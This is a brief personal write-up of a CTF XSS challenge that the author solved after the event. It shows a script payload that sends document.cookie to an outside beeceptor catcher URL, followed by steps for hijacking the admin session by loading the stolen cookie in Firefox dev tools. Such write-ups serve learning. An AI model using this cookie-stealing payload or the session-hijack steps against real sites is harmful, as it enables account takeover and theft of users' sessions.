On this challenge i did some cheating<br />
I have come across some other xss challenges like last years google ctf. I know how xss works but most of the time I just test if i can get the xss to work with a simple
alert("hi"). In the writeups before I have seen people set up severs to connect to trough the xss

As I could not do these challenges during the accual CTF time and did them in the week/weekend after I could just lookup the flag and check if my xss would have been correct.<br />
I was lucky though. The writeup i read started of by setting up a mock api at:<br />
https://beeceptor.com

Awesome! I had not seen the used xss or the flag so I could try it out myself and see if i can get something to come into my mock api.<br />
So i tested my xss:<br />
<script>location.href="https://paulovh.free.beeceptor.com?"+ document.cookie</script>

and yes i get the incomming flag on the beeceptor page! awesome no need to set up a whole server to listen to connections :D

I tried putting the session cookie i also recieved in the cookies of my firefox browser and go to the admin page: <br />
open dev tools of firefox, <br />
go to the storage tab <br />
click the + to add a cookie <br />
change the name to session <br />
and the value to the gotten session cookie HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV 

This page shows the same flag as i already got from the cookie field so seems like there is no second flag in this challenge.


